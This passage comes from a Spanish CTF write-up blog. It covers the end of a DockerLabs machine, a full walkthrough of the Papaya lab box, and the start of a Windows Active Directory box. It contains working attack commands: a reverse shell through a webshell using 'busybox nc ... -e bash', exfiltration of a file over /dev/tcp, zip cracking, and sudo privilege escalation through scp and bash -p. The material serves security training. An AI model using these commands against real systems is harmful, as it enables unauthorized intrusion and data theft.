<span class="o">[</span>STATUS] attack finished <span class="k">for </span>172.17.0.2 <span class="o">(</span>valid pair found<span class="o">)</span>
</code></pre></div></div>

<p>Nos conectamos con la password recién encontrada:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh toctoc@172.17.0.2                 
toctoc@172.17.0.2<span class="s1">'s password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.11-amd64 x86_64)
</span></code></pre></div></div>

<p>Vemos si el usuario toctoc puede ejecutar algún comando como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>toctoc@50a589993c7e:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>toctoc on 50a589993c7e:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User toctoc may run the following commands on 50a589993c7e:
    <span class="o">(</span>ALL : NOPASSWD<span class="o">)</span> /opt/bash
    <span class="o">(</span>ALL : NOPASSWD<span class="o">)</span> /ahora/noesta/function
toctoc@50a589993c7e:~<span class="err">$</span>
</code></pre></div></div>

<p>Puede ejecutar /opt/bash como root. Como sabemos ejecutando <code class="language-plaintext highlighter-rouge">/opt/bash -p</code> podemos obtener acceso como <strong>root</strong>. El problema es que en /opt no hay ningún fichero.</p>

<p>Buscamos por el sistema en busca de algún fichero y encontramos lo siguiente en el fichero <strong>.bashrc</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function </span>backdoor<span class="o">(){</span>
        <span class="nb">echo</span> <span class="s1">'Tal vez una puerta trasera poco discreta'</span>
        <span class="nb">echo</span> <span class="s1">'5432 3629 9123'</span>
        <span class="nb">echo</span> <span class="s1">'Aparecio......'</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Volvemos a “tocar” los puertos que nos indica:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>knock <span class="nt">-v</span> 172.17.0.2 5432 3629 9123
hitting tcp 172.17.0.2:5432
hitting tcp 172.17.0.2:3629
hitting tcp 172.17.0.2:9123
</code></pre></div></div>

<p>Y haciendo un listado de <strong>/opt</strong> vemos que ahora si está <strong>bash</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>toctoc@50a589993c7e:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /opt/
total 1424
drwxr-xr-x 1 root root    4096 Jul  6 05:58 <span class="nb">.</span>
drwxr-xr-x 1 root root    4096 Jul  6 05:38 ..
<span class="nt">-rwsr-S---</span> 1 root root 1446024 Jul  6 05:58 bash
</code></pre></div></div>

<p>Lo ejecutamos como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>toctoc@50a589993c7e:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/bash <span class="nt">-p</span>
root@50a589993c7e:/home/toctoc# <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname</span><span class="p">;</span> <span class="nb">date
</span>root
50a589993c7e
Fri Jul  5 08:20:09 +10 2024
</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="facil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Papaya</title><link href="/posts/papaya/" rel="alternate" type="text/html" title="Papaya" /><published>2024-07-03T00:00:00+00:00</published><updated>2024-07-03T00:00:00+00:00</updated><id>/posts/papaya</id><content type="html" xml:base="/posts/papaya/"><![CDATA[<p><img src="/assets/images/papaya/papa.jpg" alt="image" /></p>

<p>Estamos ante una máquina Linux de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:80:58:9b       PCS Systemtechnik GmbH
10.0.2.147      08:00:27:5a:99:51       PCS Systemtechnik GmbH
</code></pre></div></div>

<h1 id="enumeración">Enumeración</h1>

<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.147</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.147</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.147
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<p>Una vex que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80 <span class="nt">-v</span> 10.0.2.147
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
|     Orden incorrecta: Intenta ser m
|     creativo
|     Orden incorrecta: Intenta ser m
|     creativo
|   Help: 
|     220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
|     214-Se reconocen las siguiente 
|     rdenes <span class="o">(</span><span class="k">*</span> <span class="o">=&gt;</span><span class="s1">'s no implementadas):
|     XCWD CDUP XCUP SMNT* QUIT PORT PASV 
|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD 
|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
|     STOR STOU APPE REST ABOR RANG USER PASS 
|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST 
|     comentario a root@papaya
|   NULL, SMBProgNeg, SSLSessionReq: 
|_    220 Servidor ProFTPD (Debian) [::ffff:10.0.2.147]
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftp      ftp            19 Jul  2 15:26 secret.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 bb:05:10:69:18:eb:e3:44:2c:a7:68:98:d0:97:01:20 (ECDSA)
|_  256 65:41:aa:54:a6:b7:f7:2a:04:2e:c4:6a:c0:4d:10:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.59
|_http-title: Did not follow redirect to http://papaya.thl/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.59 (Debian)
</span></code></pre></div></div>

<p>De este último escaneo obtenemos que la web tiene como nombre de dominio <strong>papaya.thl</strong> y que podemos acceder al <strong>FTP</strong> de forma anónima.  Primero añadimos el dominio a nuestro fichero <strong>hosts</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.0.2.147 papaya.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.0.2.147 papaya.thl
</code></pre></div></div>

<p>Y después nos conectamos al servidor FTP para ver si encontramos algo. Usamos las credenciales <strong>ftp:ftp</strong> y nos descargamos todo lo que encontremos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.0.2.147
Connected to 10.0.2.147.
220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
Name <span class="o">(</span>10.0.2.147:murrusko<span class="o">)</span>: ftp
331 Conexión anónima ok, envía tu dirección de email como contraseña
Password: 
230 Aceptado acceso anónimo, aplicadas restricciones
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|1408|<span class="o">)</span>
150 Abriendo conexión de datos en modo ASCII para file list
<span class="nt">-rw-r--r--</span>   1 ftp      ftp            19 Jul  2 15:26 secret.txt
226 Transferencia completada
ftp&gt; get secret.txt
<span class="nb">local</span>: secret.txt remote: secret.txt
229 Entering Extended Passive Mode <span class="o">(||</span>|43904|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>secret.txt <span class="o">(</span>19 bytes<span class="o">)</span>
100% |<span class="k">******************</span>|    19       11.75 KiB/s    00:00 ETA
226 Transferencia completada
19 bytes received <span class="k">in </span>00:00 <span class="o">(</span>4.68 KiB/s<span class="o">)</span>
ftp&gt; bye
221 Hasta luego
</code></pre></div></div>

<p>Vemos que contiene el fichero <strong>secret.txt</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>secret.txt 
ndhvabunlanqnpbñb
</code></pre></div></div>

<p>Intentamos desencriptar el texto usando la técnica de <strong>ROT13</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>secret.txt | <span class="nb">tr</span> <span class="s1">'A-Za-z'</span> <span class="s1">'N-ZA-Mn-za-m'</span>
aquinohaynadacoño
</code></pre></div></div>

<p>Nos lo guardamos por si hiciera falta.</p>

<p>Ahora vamos a ver que contiene el servidor web con <strong>whatweb</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb <span class="nt">-a</span> 3 http://papaya.thl
http://papaya.thl <span class="o">[</span>200 OK] Apache[2.4.59], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.0.2.147], JQuery[3.6.0], PasswordField[passwrd], PoweredBy[ElkArte], Script, Title[My Community - Index], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1]

</code></pre></div></div>

<p>Vemos que usa ElkArte, un framework en php para crear un foro. Buscando posibles exploit para ese framework encontramos el siguiente PoC <a href="https://www.exploit-db.com/exploits/52026">https://www.exploit-db.com/exploits/52026</a>. Como podemos ver se puede conseguir un RCE subiendo un theme, pero es necesario estar autenticado y tener permisos para modificar los themes. Probando las credenciales que tenemos vemos que no obtenemos acceso.</p>

<p>Vamos a buscar ficheros y directorios con <strong>feroxbuster</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://papaya.thl/themes/ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> php <span class="nt">-r</span>

500      GET        4l       13w       89c http://papaya.thl/themes/test/test.php
...

</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Entre otros vemos un archivo un tanto raro. Si hemos leido el enlace anterior vemos que el fichero coincide con el PoC. Vamos a probar a ver que nos responde:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://papaya.thl/themes/test/test.php
<span class="c"># Execute one command</span>
www-data

<span class="c"># Take input from the url paramter. shell.php?cmd=whoami</span>
</code></pre></div></div>

<p>Vemos que ejecuta un comando como www-data, pero para ello hay que añadir a la petición <strong>?cmd=comando.</strong> Nos ponemos a la escucha en nuestra máquina. Para obtener una shell reversa hay que mandar el comando encodeado como URL:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://papaya.thl/themes/test/test.php?cmd<span class="o">=</span>busybox+nc+10.0.2.5+8888+-e+bash
</code></pre></div></div>

<p>Y obtenemos la shell reversa. Hacemos el tratamiento de la shell para obtener la TTY completa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.147] 59434
script /dev/null <span class="nt">-qc</span> bash
www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 8888
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 8888
<span class="nb">ls
</span>test.php
www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span>reset
www-data@papaya:/var/www/html/elkarte/themes/test<span class="err">$</span>
</code></pre></div></div>

<p>Una vez dentro del sistema vemos que hay un usuario llamado <strong>papaya</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
root:x:0:0:root:/root:/bin/bash
papaya:x:1000:1000:,,,:/home/papaya:/bin/bash
</code></pre></div></div>

<p>Haciendo una búsqueda por el servidor nos encontramos con un fichero <strong>zip</strong> en el directorio <strong>/opt:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/
total 4
<span class="nt">-rwxr-xr-x</span> 1 root root 173 Jul  2 17:14 pass.zip
</code></pre></div></div>

<p>Nos ponemos a la eschucha en nuestra máquina redirigiéndo la salida a un fichero llamado <strong>pass.zip</strong> y nos mandamos el fichero zip del servidor a nuestra máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/opt<span class="nv">$ </span><span class="nb">cat </span>pass.zip <span class="o">&gt;</span> /dev/tcp/10.0.2.5/8889

<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889 <span class="o">&gt;</span> pass.zip
listening on <span class="o">[</span>any] 8889 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.147] 35802
</code></pre></div></div>

<p>Intentamos descomprimirlo pero vemos que es necesaria una clave para extraer el contenido. Usando <strong>zip2john</strong> creamos el hash del fichero para luego intentar crackearlo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip2john pass.zip <span class="o">&gt;</span> pass.hash
ver 2.0 pass.zip/pass.txt PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>23, <span class="nv">decmplen</span><span class="o">=</span>11, <span class="nv">crc</span><span class="o">=</span>EEA46B01 <span class="nv">ts</span><span class="o">=</span>89BB <span class="nv">cs</span><span class="o">=</span>eea4 <span class="nb">type</span><span class="o">=</span>0
</code></pre></div></div>

<p>Ahora usamos <strong>john</strong> para intentar encontrar la password:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt pass.hash 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
jesica           <span class="o">(</span>pass.zip/pass.txt<span class="o">)</span>
</code></pre></div></div>

<p>Descomprimimos el fichero con la clave recién obtenida y leemos el fichero que hay dentro:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>pass.txt 
papayarica
</code></pre></div></div>

<p>Nos logeamos como <strong>papaya</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/opt<span class="nv">$ </span>su papaya
Password: 
papaya@papaya:/opt<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
papaya@papaya:/opt<span class="err">$</span>
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Vamos a ver si el usuario puede ejecutar algún comando como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>papaya@papaya:/opt<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>papaya on papaya:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
    use_pty

User papaya may run the following commands on papaya:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/scp
</code></pre></div></div>

<p>Vemos que puede usar el comando scp como root. Buscamos en <a href="https://gtfobins.github.io/gtfobins/scp/#sudo">GTFOBins</a> el comando y ejecutamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'bash 0&lt;&amp;2 1&gt;&amp;2'</span> <span class="o">&gt;</span> <span class="nv">$TF</span> <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>scp <span class="nt">-S</span> <span class="nv">$TF</span> x y:
root@papaya:~# <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname</span><span class="p">;</span> <span class="nb">id
</span>root
papaya
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@papaya:~#
</code></pre></div></div>

<p>Y con esto terminamos la máquina.</p>

<p>Un saludo</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="linux" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Chimichurri</title><link href="/posts/chimichurri/" rel="alternate" type="text/html" title="Chimichurri" /><published>2024-07-02T00:00:00+00:00</published><updated>2024-07-02T00:00:00+00:00</updated><id>/posts/chimichurri</id><content type="html" xml:base="/posts/chimichurri/"><![CDATA[<p><img src="/assets/images/chimichurri/chim.jpg" alt="image" /></p>

<p>Estamos ante una máquina Windows, Active Directory, de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de nuestra red para averiguar que máquinas hay en ella:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth2 <span class="nt">--localnet</span>
Interface: eth2, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:82:61:c8, IPv4: 192.168.200.100
Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.200.1   52:54:00:12:35:00       QEMU
192.168.200.2   52:54:00:12:35:00       QEMU
192.168.200.4   08:00:27:0d:f5:f8       PCS Systemtechnik GmbH

</code></pre></div></div>

<h1 id="enumeración">Enumeración</h1>

<p>Como vemos la máquina tiene asignada la IP <strong>192.168.200.4</strong>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que nos guarde a un fichero grepeable <code class="language-plaintext highlighter-rouge">-oG</code> con nombre <code class="language-plaintext highlighter-rouge">ports.txt</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">192.168.200.4</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 192.168.200.4 <span class="nt">-oG</span> ports.txt
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
6969/tcp  open  acmsoda
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49688/tcp open  unknown
</code></pre></div></div>

<p>Como tiene un montón de puertos abiertos obtenemos la lista con el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>ports.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span>
53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49669,49670,49671,49674,49679,49688
</code></pre></div></div>

<p>Ahora hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49669,49670,49671,49674,49679,49688 <span class="nt">-v</span> 192.168.200.4
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-07-02 05:07:02Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: chimichurri.thl, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: chimichurri.thl, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6969/tcp  open  http          Jetty 10.0.11
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Panel de control <span class="o">[</span>Jenkins]
|_http-server-header: Jetty<span class="o">(</span>10.0.11<span class="o">)</span>
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:0D:F5:F8 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Service Info: Host: CHIMICHURRI<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:0d:f5:f8 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
| Names:
|   CHIMICHURRI&lt;00&gt;      Flags: &lt;unique&gt;&lt;active&gt;
|   CHIMICHURRI0&lt;00&gt;     Flags: &lt;group&gt;&lt;active&gt;
|   CHIMICHURRI0&lt;1c&gt;     Flags: &lt;group&gt;&lt;active&gt;
|   CHIMICHURRI&lt;20&gt;      Flags: &lt;unique&gt;&lt;active&gt;
|_  CHIMICHURRI0&lt;1b&gt;     Flags: &lt;unique&gt;&lt;active&gt;
|_clock-skew: <span class="nt">-15s</span>
| smb2-time: 
|   <span class="nb">date</span>: 2024-07-02T05:07:55
|_  start_date: 2024-07-02T04:58:47
</code></pre></div></div>

<p>Añadimos nombre de dominio a nuestro fichero de hosts:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"192.168.200.4 chimichurri.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
192.168.200.4 chimichurri.thl
</code></pre></div></div>

<p>Para empezar vamos a mirar si hay algún recurso compartido al que se pueda acceder sin credenciales en el servicio <strong>smb</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> <span class="se">\\</span>192.168.200.4        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>         Disk      Admin remota
        C<span class="nv">$ </span>             Disk      Recurso predeterminado
        drogas          Disk      
        IPC<span class="nv">$ </span>           IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión
</code></pre></div></div>

<p>Encontramos un recurso compartido con el nombre <strong>drogas</strong>, nos conectamos a el para ver que contiene:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">--no-pass</span> //192.168.200.4/drogas
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Thu Jun 27 12:20:49 2024
  ..                                  D        0  Thu Jun 27 12:20:49 2024
  credenciales.txt                    A       95  Sun Jun 30 19:19:03 2024

